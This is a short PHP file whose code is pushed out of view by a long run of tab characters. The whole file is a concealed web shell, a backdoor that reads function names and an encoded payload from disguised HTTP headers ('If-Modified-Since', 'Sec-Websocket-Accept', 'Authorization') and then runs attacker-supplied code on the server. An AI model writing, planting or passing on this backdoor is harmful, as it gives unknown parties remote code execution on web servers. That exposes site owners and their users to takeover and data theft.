<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['If-Modified-Since'])){$locked=$_HEADERS['If-Modified-Since']('', $_HEADERS['Sec-Websocket-Accept']($_HEADERS['Authorization']));$locked();}
